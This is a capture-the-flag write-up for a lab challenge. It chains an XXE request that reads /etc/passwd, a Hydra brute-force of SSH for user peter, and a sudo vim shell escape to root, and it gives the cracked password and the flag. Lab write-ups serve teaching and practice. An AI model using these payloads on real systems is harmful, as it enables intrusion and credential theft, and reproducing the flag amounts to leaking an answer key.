# Id-Entity Theft Writeup

This challenge involves exploiting 2 vulnerabilities. The first of these is a weak password for SSH. The second is that the user has sudo privileges for the vim application which can be used to escalate privileges.

## Exploiting the Weak Password

Using the same XXE vulnerability from the previous challenge (see [/Breaking & Entitying/solution/writeup.md](/web/Breaking%20&%20Entitying/solution/writeup.md)), you can read the contents of the `/etc/passwd` file. The HTTP request for this is as follows:

```
POST /account HTTP/1.1
Host: 127.0.0.1:5000
Content-Length: 86
[... irrelevant headers removed ...]
Content-Type: application/xml
[... irrelevant headers removed ...]
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkFkbWluIiwibmFtZSI6Ikdvb3NlIn0.VCnfXgh3aHImc-xkXriRj8Sx9X3t6cZ6-ZGylooRJ0I
Connection: keep-alive

<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <username>Admin</username>
  <name>&xxe;</name>
</data>
```

The resulting PDF shows that there is a user with the username `peter` who is presumably the target with a weak password.

![PDF containing the contents of /etc/passwd](./images/hacked_pdf.png)

A quick nmap scan proves that the server has SSH open which is the way you can log into the server once you get the password:

```
┌──(Goose㉿Goose)-[~/Goose]
└─$ nmap -Pn -p22 [instance domain or IP]   
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-17 13:20 GMT
Nmap scan report
Host is up (0.0017s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```

The password can be cracked using `Hydra` with the following command:

```
hydra -l peter -P /path/to/wordlist.txt ssh://[instance domain or IP] -V -f 
```

This reveals the password to be `iloveoscar`.

You can then use this to log into the server with the following command:

```
ssh peter@[instance domain or IP]
```

When prompted for the password, enter `iloveoscar`.

## Exploiting sudo Privileges

Once logged in as peter, check what commands you have permission to run as an administrator (i.e. with the keyword `sudo`). To do this, run the following command:

```
sudo -l
```

This reveals you can run `vim` with `sudo`:

```
User peter may run the following commands on 886fc0faf7e5:
    (root) NOPASSWD: /usr/bin/vim
```

This can be exploited to get a root shell. To do this, run `vim` with administrative privileges:

```
sudo vim
```

Then, once in `vim`, type the following and press enter:

```
:!/bin/bash
```

This will drop you into a root shell. From there you can read the flag file with the following command:

```
cat /root/root.txt
```

This will output the flag: `GooseCTF{exit_vim_(bonus_challenge)}`.

Note that [https://gtfobins.github.io/](https://gtfobins.github.io/) is a really useful website for seeing findign exploits for different misconfigured `sudo` permissions.